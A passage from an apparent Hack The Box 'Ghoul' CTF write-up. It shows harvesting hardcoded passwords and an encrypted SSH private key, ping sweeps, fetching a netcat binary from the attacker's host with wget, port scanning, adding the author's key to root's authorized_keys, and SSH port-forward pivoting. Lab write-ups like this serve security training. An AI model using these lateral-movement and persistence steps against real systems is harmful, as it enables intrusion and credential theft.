..&#x2F;..&#x2F;noro&#x2F;.ssh&#x2F;</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;noro&#x2F;.ssh# ls -al</span><br><span class="line">total 28</span><br><span class="line">drwx------ 1 noro noro 4096 Dec 13  2018 .</span><br><span class="line">drwx------ 1 noro noro 4096 Dec 13  2018 ..</span><br><span class="line">-rwx------ 1 noro noro  393 Dec 13  2018 authorized_keys</span><br><span class="line">-rwx------ 1 noro noro 1675 Dec 13  2018 id_rsa</span><br><span class="line">-rwx------ 1 noro noro  393 Dec 13  2018 id_rsa.pub</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;noro&#x2F;.ssh# cat authorized_keys </span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAIchqQ1i+uOQ4jckHbO8sdtks3Cm6Ygie9youcFvqH6rBSxqWdQn8PdQ&#x2F;HgrXN+RvED28aRC0kkzACL79gx9RGS4&#x2F;kxqZBlPyP9mu7BWmC1J0NLACws0mvinztpixUaNj2w4WaBBe2+MpfeRoo9Abk4sBcZC7De6ZZl6RRqrdsb1kTZSWMXyxIOJMZrc+3dAc5+faujSkyeVbudjSlLf3g8xis&#x2F;uSE3OvGhF4ypYDGDSRYbLY8oScDNU0eQexGMXYcY10z5f69hnrvaZ8wkvTKXwqHoMpgtjBz5NxewnY6UqhdMn0LkEeZdtK6UPRHdfSwoxjOgSyjaEmhU013d+p noro@Aogiri</span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;noro&#x2F;.ssh#</span><br></pre></td></tr></table></figure>
<p>In <code>kaneki</code>‘s <code>authorized_keys</code> there was a public key for <code>kaneki_pub@kaneki-pc</code>, with that and the hints about <code>kaneki</code>‘s pc and the other file server it was obvious that we need to pivot to another host. But before that I could find some passwords in <code>/var/www/html/users/login.php</code> :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> session_start(); <span class="comment">/* Starts the session */</span></span><br><span class="line">        <span class="comment">/* Check Login form submitted */</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Submit'</span>]))&#123;</span><br><span class="line">                <span class="comment">/* Define username and associated password array */</span></span><br><span class="line">                $logins = <span class="keyword">array</span>(<span class="string">'kaneki'</span> =&gt; <span class="string">'123456'</span>,<span class="string">'noro'</span> =&gt; <span class="string">'password123'</span>,<span class="string">'admin'</span> =&gt; <span class="string">'abcdef'</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Check and assign submitted Username and Password to new variable */</span>                                                   </span><br><span class="line">                $Username = <span class="keyword">isset</span>($_POST[<span class="string">'Username'</span>]) ? $_POST[<span class="string">'Username'</span>] : <span class="string">''</span>;</span><br><span class="line">                $Password = <span class="keyword">isset</span>($_POST[<span class="string">'Password'</span>]) ? $_POST[<span class="string">'Password'</span>] : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Check Username and Password existence in defined array */</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>($logins[$Username]) &amp;&amp; $logins[$Username] == $Password)&#123;</span><br><span class="line">                        <span class="comment">/* Success: Set session variables and redirect to Protected page  */</span></span><br><span class="line">                        $_SESSION[<span class="string">'UserData'</span>][<span class="string">'Username'</span>]=$logins[$Username];</span><br><span class="line">                        header(<span class="string">"location:index.php"</span>);</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">/*Unsuccessful attempt: Set error message */</span></span><br><span class="line">                        $msg=<span class="string">"&lt;span style='color:red'&gt;Invalid Login Details&lt;/span&gt;"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>And in <code>/usr/share/tomcat7/conf/tomcat-users.xml</code> :</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version='1.0' encoding='utf-8'?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  Licensed to the Apache Software Foundation (ASF) under one or more</span></span><br><span class="line"><span class="comment">  contributor license agreements.  See the NOTICE file distributed with</span></span><br><span class="line"><span class="comment">  this work for additional information regarding copyright ownership.</span></span><br><span class="line"><span class="comment">  The ASF licenses this file to You under the Apache License, Version 2.0</span></span><br><span class="line"><span class="comment">  (the "License"); you may not use this file except in compliance with</span></span><br><span class="line"><span class="comment">  the License.  You may obtain a copy of the License at</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      http://www.apache.org/licenses/LICENSE-2.0</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Unless required by applicable law or agreed to in writing, software</span></span><br><span class="line"><span class="comment">  distributed under the License is distributed on an "AS IS" BASIS,</span></span><br><span class="line"><span class="comment">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span></span><br><span class="line"><span class="comment">  See the License for the specific language governing permissions and</span></span><br><span class="line"><span class="comment">  limitations under the License.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">tomcat-users</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span>  By default, no user is included in the "manager-gui" role required</span></span><br><span class="line"><span class="comment">  to operate the "/manager/html" web application.  If you wish to use this app,</span></span><br><span class="line"><span class="comment">  you must define such a user - the username and password are arbitrary. It is</span></span><br><span class="line"><span class="comment">  strongly recommended that you do NOT use one of the users in the commented out</span></span><br><span class="line"><span class="comment">  section below since they are intended for use with the examples web</span></span><br><span class="line"><span class="comment">  application.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  <span class="doctag">NOTE:</span>  The sample user and role entries below are intended for use with the</span></span><br><span class="line"><span class="comment">  examples web application. They are wrapped in a comment and thus are ignored</span></span><br><span class="line"><span class="comment">  when reading this file. If you wish to configure these users for use with the</span></span><br><span class="line"><span class="comment">  examples web application, do not forget to remove the &lt;!.. ..&gt; that surrounds</span></span><br><span class="line"><span class="comment">  them. You will also need to set the passwords to something appropriate.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">  &lt;role rolename="tomcat"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;role rolename="role1"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username="tomcat" password="&lt;must-be-changed&gt;" roles="tomcat"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username="both" password="&lt;must-be-changed&gt;" roles="tomcat,role1"/&gt;</span></span><br><span class="line"><span class="comment">  &lt;user username="role1" password="&lt;must-be-changed&gt;" roles="role1"/&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">user</span> <span class="attr">username</span>=<span class="string">"admin"</span> <span class="attr">password</span>=<span class="string">"admin"</span> <span class="attr">roles</span>=<span class="string">"admin"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">role</span> <span class="attr">rolename</span>=<span class="string">"admin"</span> /&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--&lt;user username="admin" password="test@aogiri123" roles="admin" /&gt;</span></span><br><span class="line"><span class="comment">  &lt;role rolename="admin" /&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">tomcat-users</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>123456</code>, <code>password123</code> and <code>test@aogiri123</code>. Maybe we’ll need them later.<br>I checked the other interfaces :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;home&#x2F;noro# ifconfig </span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.20.0.10  netmask 255.255.0.0  broadcast 172.20.255.255</span><br><span class="line">        ether 02:42:ac:14:00:0a  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 54427  bytes 10267568 (10.2 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 49877  bytes 43322005 (43.3 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 467  bytes 46415 (46.4 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 467  bytes 46415 (46.4 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">root@Aogiri:&#x2F;home&#x2F;noro#</span><br></pre></td></tr></table></figure>
<p><code>Aogiri</code>‘s ip on <code>eth0</code> is <code>172.20.0.10</code>. We need to know what other hosts are live on that subnet so we will do a simple <a href="https://en.wikipedia.org/wiki/Ping_sweep" target="_blank" rel="noopener">ping sweep</a> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:~# for i in &#123;1..255&#125;; do ping -c 1 172.20.0.$i; done | grep &#39;ttl&#x3D;&#39;</span><br><span class="line">64 bytes from 172.20.0.1: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.109 ms</span><br><span class="line">64 bytes from 172.20.0.10: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.066 ms</span><br><span class="line">64 bytes from 172.20.0.150: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.272 ms</span><br><span class="line">root@Aogiri:~#</span><br></pre></td></tr></table></figure>
<p>We got <code>172.20.0.150</code> we need to scan it for open ports, neither <code>nmap</code> nor <code>nc</code> was installed so I got a <a href="https://github.com/yunchih/static-binaries/blob/master/nc" target="_blank" rel="noopener">static version</a> of <code>nc</code> and uploaded it :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;tmp# wget http:&#x2F;&#x2F;10.10.xx.xx&#x2F;nc</span><br><span class="line">--2019-10-04 13:05:16--  http:&#x2F;&#x2F;10.10.xx.xx&#x2F;nc</span><br><span class="line">Connecting to 10.10.xx.xx:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 959800 (937K) [application&#x2F;octet-stream]</span><br><span class="line">Saving to: ‘nc’</span><br><span class="line">nc                                                   100%[&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&gt;] 937.30K   242KB&#x2F;s    in 5.3s</span><br><span class="line">2019-10-04 13:05:22 (177 KB&#x2F;s) - ‘nc’ saved [959800&#x2F;959800]</span><br><span class="line">root@Aogiri:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
<p>I scanned the first 1000 ports and <code>ssh</code> was open :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;tmp# .&#x2F;nc -zv 172.20.0.150 1-1000</span><br><span class="line">64978af526b2.Aogiri [172.20.0.150] 22 (ssh) open</span><br><span class="line">root@Aogiri:&#x2F;tmp#</span><br></pre></td></tr></table></figure>
<p>Assuming that <code>172.20.0.150</code> is <code>kaneki-pc</code> we can use <code>kaneki</code>‘s private key to ssh as <code>kaneki_pub</code>. But there was a problem, the key is encrypted :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">Proc-Type: 4,ENCRYPTED</span><br><span class="line">DEK-Info: AES-128-CBC,9E9E4E88793BC9DB54A767FC0216491F</span><br><span class="line"></span><br><span class="line">wqcYgOwX3V511WRuXWuRheYyzo5DelW+&#x2F;XsBtXoL8&#x2F;Ow7&#x2F;Tj4EC4dKCfas39HQW8</span><br><span class="line">MNbTv51gYxQ&#x2F;Vc3W1jEYSyxTCYAu600naUhX3+En7P8kje2s0I4VEZX0MJqgB&#x2F;pv</span><br><span class="line">J9nPBtbXcqV6&#x2F;v6Vkbc5kGtMiRVMYzS9KWiCOafveFQCr1orYmnNINsZou4AWrfB</span><br><span class="line">Ofr63sUVD8V1Rabnoltbo+pePXnQ6HqjpO1b2qCyUQBxDxwSFT5a+j5YvMYV3JXK</span><br><span class="line">HOo4D0fcMoBVT46pXga6wZtiB4XgeM&#x2F;iB&#x2F;xg6YfdfMPuDBJ6+fqZMjlm+GvEexkl</span><br><span class="line">EEtJAqoSG&#x2F;yCOjedByVqmfKye9DaIY9Um2WkWcX1bVRlYktYtpb755aDmVVoQjb5</span><br><span class="line">CmW4yuLapjqUrGEFY+ghLLRdZvSBPZ18PbUgVMqpdmrfnEy48d22IGPJ6ZO2L4qR</span><br><span class="line">FzLjkQkjFRgkrBJ9bSzYS&#x2F;NYZ8QGQh&#x2F;wk3BHaupjLxD2j1Ta7PXwCjh4zBZNPO&#x2F;e</span><br><span class="line">9VN9c+b&#x2F;zwYSyyeKcJ8dhFEH26j5g93EnWTkdLEMyw6tRbdzhQbNo02WWDTvWPJv</span><br><span class="line">+6A+6xA6&#x2F;+NxacHXfyfxQ+l8CsmpZ5CgKjKHfFeDYZHyoPhcthKkL3Go3rqZ1HOb</span><br><span class="line">MimhTR3wOUwoV&#x2F;XaVcCvW+5LwPh1ljdnHCjaY2VzKns4&#x2F;X+2dZtOsDz5aCovN7mM</span><br><span class="line">eHsRuIEVKtZ2EijKfYZGtDaDwTd&#x2F;1YTDooGdDDdDipr8bTDvD14r07Yk&#x2F;xrfjEUp</span><br><span class="line">V9+v3PzmD1trqIlFw+7D8ogFsXJ&#x2F;P+raVFWaihQWEeqOnGXEhHQ0afgcVt9w62tV</span><br><span class="line">1YeVA0RwHu4S1IObji9RP1DfAMid0pCSnvAoFd&#x2F;EArnAtwgPFOLqvPZj5j+LjFPL</span><br><span class="line">sOHUW+N+cY24HpH1UVTEWAkgkiGz89&#x2F;bF98c1kpoLEkS2sjU+jVONTBlLeRmqcDJ</span><br><span class="line">YnCcPXrkT6oC&#x2F;wctYlM141hrctWRyjY+f0IwREDCv8TM1aAAY3vaZUdMfy71Q3DE</span><br><span class="line">PO4S5ivuruwGeCQmGhEmWBSm0PwpGd0pNbHv+zs0TH+2lmAn8O3R2UrcCu0TxhmH</span><br><span class="line">oW0mQbl+2u+xVB5ijjqtm0CFLsXiX17FdCbMp1huCMTx9TuY6GMeSsN6X7exTIcx</span><br><span class="line">DEvpUHREXgtVqBdNX1QxIoMIxpK2qlMfPYtGikthba5fjBof0b&#x2F;8lJvtZuoWrJ9R</span><br><span class="line">L0HWW16fkbjEXSrwdEb5zjntCxJKLWmKgiFfaoJ9&#x2F;L1yhc12w&#x2F;EQjpUxGkFdyeMs</span><br><span class="line">7QyGClGpKFU4GQvKMQYei57sNk&#x2F;ZUPgPWizNfuuU&#x2F;8qBhKXG9JB2R3GWFTEpxzO8</span><br><span class="line">luTnBEUn8Se3cLNrBQ05LIVk2jRYhUE6IBWFYvhjQUGChZTZjSlxNR55t6olYj2M</span><br><span class="line">JBxtT5E2YDhSk4nB21IlTIurggP9pNm+PtTTt2o0jzOD5uOHko6VzGz4Ukvbo0gZ</span><br><span class="line">&#x2F;zyr4fR7OhGG0grtKxV1s2PpDt9bkhnMXJ+I8zZVN9INHUsoE5IXtpKKJOCQYFjQ</span><br><span class="line">v+EB7xAmWe1q9xSgLSq6I1fWJrYqjkOd9TpqVPNoyTGWM1ELYXyHah8vZi+0BFzh</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>
<p>I tried to crack the key but I couldn’t find the password in <code>rockyou</code>. Then I remembered <code>/secret.php</code> when <code>Noro</code> asked <code>Kaneki</code> for access and <code>Kaneki</code> replied with a weird string that looked like a password (<code>ILoveTouka</code>) :<br><img src="/images/hackthebox/ghoul/2.png" alt=""><br>I tried that as the key password and it worked :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# nano kaneki.key</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# chmod 600 kaneki.key </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# ssh -i kaneki.key kaneki@ghoul.htb </span><br><span class="line">Enter passphrase for key &#39;kaneki.key&#39;: </span><br><span class="line">Last login: Fri Oct  4 11:40:26 2019 from 10.10.15.168</span><br><span class="line">kaneki@Aogiri:~$</span><br></pre></td></tr></table></figure>
<p>Since I’m going to tunnel stuff I echoed my public key to <code>/root/.ssh/authorized_keys</code> and I got ssh as root :<br><img src="/images/hackthebox/ghoul/18.png" alt=""><br>I forwarded port 22 on <code>172.20.0.150</code> then I sshed to the box as <code>kaneki_pub</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# ssh -i id_rsa -L 2020:172.20.0.150:22 root@ghoul.htb </span><br><span class="line">Last login: Fri Oct  4 13:13:00 2019 from 10.10.xx.xx</span><br><span class="line">root@Aogiri:~#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;ghoul# ssh kaneki_pub@localhost -p 2020 -i .&#x2F;kaneki.key </span><br><span class="line">Enter passphrase for key &#39;.&#x2F;kaneki.key&#39;: </span><br><span class="line">Last login: Fri Oct  4 11:35:41 2019 from 172.20.0.10</span><br><span class="line">kaneki_pub@kaneki-pc:~$</span><br></pre></td></tr></table></figure>


<h2 id="RCE-in-gogs-Pivoting-from-kaneki-pc-to-git"><a href="#RCE-in-gogs-Pivoting-from-kaneki-pc-to-git" class="headerlink" title="RCE in gogs, Pivoting from kaneki-pc to git"></a>RCE in gogs, Pivoting from kaneki-pc to git</h2><p>There was a text file called <code>to-do.txt</code> in the home directory :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">kaneki_pub@kaneki-pc:~$ ls -la</span><br><span class="line">total 40</span><br><span class="line">drwx------ 3 kaneki_pub kaneki_pub 4096 Dec 16  2018 .</span><br><span class="line">drwxr-xr-x 1 root       root       4096 Dec 16  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root       root          9 Dec 29  2018 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rwx------ 1 kaneki_pub kaneki_pub  220 Dec 16  2018 .bash_logout</span><br><span class="line">-rwx------ 1 kaneki_pub kaneki_pub 3771 Dec 16  2018 .bashrc</span><br><span class="line">-rwx------ 1 kaneki_pub kaneki_pub  807 Dec 16  2018 .profile</span><br><span class="line">drwx------ 2 kaneki_pub kaneki_pub 4096 Dec 16  2018 .ssh</span><br><span class="line">-rw------- 1 kaneki_pub kaneki_pub 3139 Dec 16  2018 .viminfo</span><br><span class="line">-rw-r--r-- 1 kaneki_pub kaneki_pub  165 Dec 16  2018 .wget-hsts</span><br><span class="line">-rw-r--r-- 1 root       root         44 Dec 16  2018 to-do.txt</span><br><span class="line">kaneki_pub@kaneki-pc:~$ cat to-do.txt </span><br><span class="line">Give AogiriTest user access to Eto for git.</span><br><span class="line">kaneki_pub@kaneki-pc:~$</span><br></pre></td></tr></table></figure>
<p>On <code>Aogiri</code> there was a hint about a vulnerability in <code>gogs</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Aogiri:&#x2F;home&#x2F;kaneki# cat note.txt </span><br><span class="line">Vulnerability in Gogs was detected. I shutdown the registration function on our server, please ensure that no one gets access to the test accounts.</span><br></pre></td></tr></table></figure>

<blockquote>
<p>A painless self-hosted Git service. -<a href="https://gogs.io/" target="_blank" rel="noopener">gogs.io</a></p>
</blockquote>
<p>I checked the interfaces and there was a new subnet :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">kaneki_pub@kaneki-pc:~$ ifconfig </span><br><span class="line">eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.20.0.150  netmask 255.255.0.0  broadcast 172.20.255.255</span><br><span class="line">        ether 02:42:ac:14:00:96  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 8644  bytes 924940 (924.9 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 5908  bytes 2135441 (2.1 MB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">eth1: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500</span><br><span class="line">        inet 172.18.0.200  netmask 255.255.0.0  broadcast 172.18.255.255</span><br><span class="line">        ether 02:42:ac:12:00:c8  txqueuelen 0  (Ethernet)</span><br><span class="line">        RX packets 1650  bytes 2723948 (2.7 MB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 1684  bytes 352910 (352.9 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536</span><br><span class="line">        inet 127.0.0.1  netmask 255.0.0.0</span><br><span class="line">        loop  txqueuelen 1000  (Local Loopback)</span><br><span class="line">        RX packets 25  bytes 1661 (1.6 KB)</span><br><span class="line">        RX errors 0  dropped 0  overruns 0  frame 0</span><br><span class="line">        TX packets 25  bytes 1661 (1.6 KB)</span><br><span class="line">        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0</span><br><span class="line"></span><br><span class="line">kaneki_pub@kaneki-pc:~$</span><br></pre></td></tr></table></figure>
<p>So I ran another ping sweep :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kaneki_pub@kaneki-pc:~$ for i in &#123;1..255&#125;; do ping -c 1 172.18.0.$i; done | grep &#39;ttl&#x3D;&#39;</span><br><span class="line">64 bytes from 172.18.0.1: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.125 ms</span><br><span class="line">64 bytes from 172.18.0.2: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.146 ms</span><br><span class="line">64 bytes from 172.18.0.200: icmp_seq&#x3D;0 ttl&#x3D;64 time&#x3D;0.054 ms</span><br></pre></td></tr></table></figure>
<p>And again I downloaded <code>nc</code> to scan the discovered host (<code>172.18.0.200</code>) :</p>
